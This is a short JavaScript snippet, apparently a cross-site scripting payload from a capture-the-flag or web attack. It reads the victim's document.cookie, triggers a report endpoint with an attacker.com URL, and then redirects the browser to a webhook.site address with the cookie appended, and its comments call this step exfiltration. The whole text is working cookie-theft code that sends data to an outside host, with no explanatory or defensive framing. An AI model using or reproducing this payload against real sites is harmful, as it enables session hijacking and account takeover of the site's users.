// First log to console so you can see it
console.log('Cookie:', document.cookie);

// Try to send via allowed endpoint
fetch('/report?url=https://attacker.com').then(() => {
    // After it completes, redirect to exfiltrate
    setTimeout(() => {
        window.location = 'https://webhook.site/0c5e2136-42eb-4d9a-8813-83182fee95ed?cookie=' + encodeURIComponent(document.cookie);
    }, 100);
});